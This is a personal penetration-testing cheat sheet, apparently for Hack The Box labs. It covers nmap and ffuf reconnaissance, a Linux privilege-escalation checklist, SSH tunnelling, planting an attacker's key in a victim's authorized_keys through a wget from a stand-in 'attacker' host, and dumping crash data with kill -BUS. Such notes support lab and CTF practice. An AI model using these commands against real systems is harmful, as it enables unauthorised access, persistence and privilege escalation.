# Initial Recon

### nmap

1. `nmap -sSV -Pn -p- -A <target>`
2. `nmap -sU -v <target> --min-rate=50`

### Sub-domain Enum

1. `ffuf -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/' -H 'HOST: FUZZ.website.com' -fs 2309`
3. `python3 sublist3r -d <domain>`

### Sub-Directoy Enum

1. `ffuf -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://<SERVER_IP>:<PORT>/FUZZ" -recursion -recursion-depth 1 -e .php`
2. `gobuster dir -x php,txt -u 10.129.255.70 -w /usr/share/wordlists/dirb/common.txt`

### Parameter Fuzzing

1. `ffuf -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`
2. `ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://<SERVER_IP>:<PORT>/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`

### Page Type Fuzzing

1. `ffuf -w SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u "http://<SERVER_IP>:<PORT>/indexFUZZ"`


# Web Attacks

SQL Injection
- [sqlmap](https://github.com/jinhaochan/HTB/tree/master/Academy/SQLmap)
- [sql injection](https://github.com/jinhaochan/HTB/tree/master/Academy/SQL%20Injection)
- [file inclusion](https://github.com/jinhaochan/HTB/tree/master/Academy/File_Inclusion)


Proxy chains
---
```
edit /etc/proxychains4.conf 

examples:
http <ip> <port>
socks5 <victim service> <victim port> <user> <password>

$ proxychains ssh user@<ip>
```

Other web stuff
---
- Check SSL cert
- Check email domains
- Check 404 pages
- Try both `/tmp` and `/dev/shm` for file writes

# Local Attacks

1. Check what groups you are in
    - `id` 
2. Find all binaries that this group can run
    - `find / -group <group> -type f 2>/dev/null`
3. Shows all command this user can run as sudo
    - `sudo -l`
    - Check for configs that are preserved with `env_keep` which can be used to preload custom files
4. find all binaries with sticky bit set
    - `find / -perm -u=s -type f 2>/dev/null`
5. Find all listening services
    - `ss -tuan | grep LISTEN`
    - Use SSH portforwarding to forward the service to your machine
6. Check for local services
    - `nc -zv 127.0.0.1 1-65535 2>&1 | grep -v "refused"`
7. Gets capabilities of binaries
    - `getcap -r / 2>/dev/null`
    - https://gtfobins.github.io/#+capabilities
8. Check configuration files
    - `/etc/mysql/my.cnf`
    - `/etc/apache2/apache2.conf`
    - `/etc/apache2/sites-enabled/000-default.conf`
    - `etc/nginx/sites-available/default.conf`
    - `etc/nginx/nginx.conf`
9. Check mail
    - `/var/mail`
    - `/var/spool/mail`
10. Check interesting folders
    - `/opt` 
11. Check for most recently modified files
12. If in group `adm`, check `/var/logs/audit`
    - `aureport --help`
13. Run pspy64 to check running process (likely cron)
    - https://github.com/DominicBreuker/pspy
14. Check the mounts `/dev/sda*`
15. Check binaries being used that do not use absolute path `ltrace <binary> 2> out`
16. Check Processes running in /proc
```
for val in range(1,1000):
    try:
        with open("/proc/"+str(val)+"/cmdline", 'r') as f:
            lines = f.readlines()
            print(lines)
    except:
        pass
```

### SSH port forwarding

append your pub key to `/home/user/.ssh/authorized_keys`

On your attacker machine:

`ssh -L <local port>:<victim service>:<victim port> <victim>@<ip>`

OR using dynamic forwarding for attacks

`ssh -D <local port> <victim>@<ip>`


### Adding your SSH to the victim

Append your public to the victim's ~/.ssh/authorized_keys

```
On attacker:
ssh-keygen

On victim:
wget http://attacker/id_rsa.pub
cat id_rsa.pub >> ~/.ssh/authorized_keys
```

### Getting Crash Data

While program is running, kill it with

```
kill -BUS <pid>

Get the data from the crash log
---
apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashed
strings /tmp/crashed/CoreDump
```

